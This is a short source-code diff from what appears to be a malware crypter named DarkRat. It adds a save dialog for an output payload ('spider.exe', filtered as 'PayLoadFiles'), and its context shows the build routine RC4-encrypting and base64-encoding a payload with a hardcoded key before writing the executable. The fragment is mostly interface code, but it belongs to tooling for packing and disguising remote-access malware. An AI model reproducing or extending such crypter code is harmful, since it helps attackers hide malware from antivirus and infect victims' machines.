@@ -85,9 +85,16 @@ void DarkRatCrypterUI::on_gen_mutex_clicked()
 
 void DarkRatCrypterUI::on_btn_change_output_clicked()
 {
-	QMessageBox msgBox1;
-	msgBox1.setText("TODO");
-	msgBox1.exec();
+
+
+	QString fileName = QFileDialog::getSaveFileName(this, tr("Save File"),
+		"spider.exe",
+		tr("PayLoadFiles (*.exe)"));
+
+	ui.outputname->setText(fileName);
+
+
+
 }
 
 void DarkRatCrypterUI::on_gen_enckey_clicked()
@@ -151,8 +158,6 @@ void DarkRatCrypterUI::on_build_clicked()
 	write = rc4.doRC4(write, key(32, 0x4d930cf57cfda1ba));
 	write = darkRat::crypto::b64::encode(write.c_str());
 	char* c_write = &write[0u];
-
-
 
 	//output_file
 	std::string szFilePath ="bin\\spider.exe";
